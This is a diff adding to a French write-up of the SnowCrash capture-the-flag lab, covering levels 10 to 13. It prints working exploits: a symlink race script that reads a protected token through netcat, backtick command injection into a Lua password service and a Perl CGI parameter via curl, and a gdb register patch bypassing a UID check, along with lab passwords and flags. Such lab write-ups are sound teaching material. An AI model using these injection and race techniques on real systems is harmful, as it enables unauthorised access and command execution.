@@ -583,14 +583,20 @@ Voici le script utilisé pour ce niveau
 #!/bin/bash
 
 echo "dummy" > /tmp/dummy
+
+rm -f /tmp/token_content
 touch /tmp/token_content
-nc -l 6969 > /tmp/token_content
+
+nc -l 6969 > /tmp/token_content &
+NC_PID=$!
 sleep 1
 
 (while true; do
     ln -sf /tmp/dummy /tmp/exploit
     ln -sf /home/user/level10/token /tmp/exploit
-done)
+done) &
+
+LINK_PID=$!
 
 while true; do
     ./level10 /tmp/exploit 127.0.0.1 2>/dev/null
@@ -598,7 +604,215 @@ while true; do
     if [ -s /tmp/token_content ]; then
         echo "Token capturé !"
         cat /tmp/token_content
+        kill $LINK_PID 2>/dev/null
+        kill $NC_PID 2>/dev/null
         break
     fi
 done
 ```
+
+Apres plusieurs test on obtient: woupa2yuojeeaaed06riuj63c
+
+```bash
+level10@SnowCrash:~$ su flag10
+Password:
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+```
+
+### level-11
+
+On voit un script en lua mettant en place un serveur reseau mais le pass est vulnerable a l'injection de commande
+
+```lua
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+
+  end
+
+  client:close()
+end
+```
+Donc tout simplement:
+
+```
+level11@SnowCrash:~$ nc localhost 5151
+Password: ` getflag > /tmp/flag`
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
+
+### level-12
+
+Cette fois ci on y voit un script perl qui prend en premier arg un variable x dont il tr le contenue en majuscule.
+il cherche le contenu dans /tmp/xd et execute le contenu
+```perl
+
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/;
+  $xx =~ s/\s.*//;
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }
+}
+
+n(t(param("x"), param("y")));
+```
+Voici la solution:
+
+```bash
+level12@SnowCrash:~$ echo "getflag > /tmp/flag" > /tmp/XD
+level12@SnowCrash:~$ chmod 777 /tmp/XD
+level12@SnowCrash:~$ curl 'http://localhost:4646?x=`/*/XD`'
+..level12@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+```
+
+### level-13
+
+On execute le binaire:
+```bash
+level13@SnowCrash:~$ ./level13
+UID 2013 started us but we we expect 4242
+```
+
+On met sur ghidra :
+
+```c
+void main(void)
+
+{
+  __uid_t _Var1;
+  undefined4 uVar2;
+  
+  _Var1 = getuid();
+  if (_Var1 != 0x1092) {
+    _Var1 = getuid();
+    printf("UID %d started us but we we expect %d\n",_Var1,0x1092);
+                      /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  uVar2 = ft_des("boe]!ai0FB@.:|L6l@A?>qJ}I");
+  printf("your token is %s\n",uVar2);
+  return;
+}
+```
+On y voit une comparaison donc on lance gdb pour manipuler les registres mais avant ça on regarde les instruction assembleur
+
+```bash
+level13@SnowCrash:~$ gdb level13
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level13/level13...(no debugging symbols found)...done.
+(gdb) disass main
+Dump of assembler code for function main:
+   0x0804858c <+0>:	push   %ebp
+   0x0804858d <+1>:	mov    %esp,%ebp
+   0x0804858f <+3>:	and    $0xfffffff0,%esp
+   0x08048592 <+6>:	sub    $0x10,%esp
+   0x08048595 <+9>:	call   0x8048380 <getuid@plt>
+   0x0804859a <+14>:	cmp    $0x1092,%eax
+   0x0804859f <+19>:	je     0x80485cb <main+63>
+   0x080485a1 <+21>:	call   0x8048380 <getuid@plt>
+   0x080485a6 <+26>:	mov    $0x80486c8,%edx
+   0x080485ab <+31>:	movl   $0x1092,0x8(%esp)
+   0x080485b3 <+39>:	mov    %eax,0x4(%esp)
+   0x080485b7 <+43>:	mov    %edx,(%esp)
+   0x080485ba <+46>:	call   0x8048360 <printf@plt>
+   0x080485bf <+51>:	movl   $0x1,(%esp)
+   0x080485c6 <+58>:	call   0x80483a0 <exit@plt>
+   0x080485cb <+63>:	movl   $0x80486ef,(%esp)
+   0x080485d2 <+70>:	call   0x8048474 <ft_des>
+   0x080485d7 <+75>:	mov    $0x8048709,%edx
+   0x080485dc <+80>:	mov    %eax,0x4(%esp)
+   0x080485e0 <+84>:	mov    %edx,(%esp)
+   0x080485e3 <+87>:	call   0x8048360 <printf@plt>
+   0x080485e8 <+92>:	leave
+   0x080485e9 <+93>:	ret
+End of assembler dump.
+```
+On y voit ces lignes qui correspondent bel et bien a notre if ou on y voit la comparaison 
+
+```
+   0x0804859a <+14>:	cmp    $0x1092,%eax
+   0x0804859f <+19>:	je     0x80485cb <main+63>
+```
+https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=1092
+La valeur en hexa 0x1092 qui correspond a 4242
+
+On attribue a notre registre eax la valeur de 0x1092 puis on obtient le flag
+```bash
+(gdb) b *0x0804859a
+Breakpoint 1 at 0x804859a
+(gdb) run
+Starting program: /home/user/level13/level13
+
+Breakpoint 1, 0x0804859a in main ()
+(gdb) set $eax=0x1092
+(gdb) print $eax
+$1 = 4242
+(gdb) continue
+Continuing.
+your token is 2A31L79asukciNyi8uppkEuSx
+[Inferior 1 (process 5246) exited with code 050]
+```
+
+### level-14
+
+
